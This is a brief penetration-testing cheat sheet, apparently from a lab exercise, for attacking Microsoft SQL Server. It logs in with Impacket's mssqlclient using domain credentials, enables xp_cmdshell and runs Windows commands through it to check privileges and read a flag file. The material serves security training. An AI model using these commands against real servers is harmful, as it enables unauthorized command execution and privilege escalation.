# SQL Server Admin
Connect to a SQL Server using domain credentials
```
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```
Enable xp_cmdshell to execute Windows system commands directly from the SQL Server
```
enable_xp_cmdshell
```
Perform lateral movement or privilege escalation if the SQL service is running as SYSTEM or Administrator
```
whoami /priv
xp_cmdshell "type C:\Users\damundsen\Desktop\flag.txt"
```
